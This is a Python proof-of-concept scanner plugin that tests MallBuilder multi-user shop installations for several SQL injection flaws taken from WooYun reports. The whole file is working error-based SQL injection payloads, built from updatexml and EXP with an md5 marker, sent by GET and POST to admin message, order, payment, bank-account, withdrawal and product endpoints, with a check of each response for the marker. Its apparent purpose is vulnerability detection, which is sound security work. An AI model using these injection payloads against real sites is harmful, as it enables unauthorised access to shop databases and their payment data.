#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
"""
POC Name  :  mallbuilder多用户商城(最新版)SQL注入二，四，五，六，七
Author    :  a
mail      :  a@lcx.cc
refer     : http://www.wooyun.org/bugs/wooyun-2015-0120156
            http://www.wooyun.org/bugs/wooyun-2015-0120160
            http://www.wooyun.org/bugs/wooyun-2015-0120578
            http://www.wooyun.org/bugs/wooyun-2015-0120581
            http://www.wooyun.org/bugs/wooyun-2015-0120607
"""

def assign(service, arg):
    if service == "mallbuilder":
        return True, arg

def audit(arg):
    payloads=['?m=message&s=admin_message_list_delbox&rid=1%20and%20EXP(~(select%20*%20from%20(select%20md5(3.14))a))',
              '?m=product&s=admin/order_detail&oid=updatexml(1,concat(0x5c,md5(3.14)),1)']
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode,finalurl =  curl.curl2(url)
        if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
            security_hole(url)

            
    data='action=a&result=1&id=1%20or%20updatexml(1,concat(0x5c,md5(3.14)),1)'
    path='?m=payment&s=admin/bank_account_mod'
    url = arg + path
    code, head, res, errcode,finalurl =  curl.curl2(url,data)
    if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
        security_hole(url)

        
    data='result=50&id=updatexml(1,concat(0x5c,md5(3.14)),1)&act=edit'
    path='?m=payment&s=admin/withdraw&operation=edit'
    url = arg + path
    code, head, res, errcode,finalurl =  curl.curl2(url,data)
    if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
        security_hole(url)

    data='action=111&id=updatexml(1,concat(0x5c,md5(3.14)),1)'
    path='?m=product&s=admin/cpmod'
    url = arg + path
    code, head, res, errcode,finalurl =  curl.curl2(url,data)
    if code == 200 and "4beed3b9c4a886067de0e3a094246f7" in res:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('mallbuilder', 'http://127.0.0.1:8080/mallbuilderv5.8/')[1])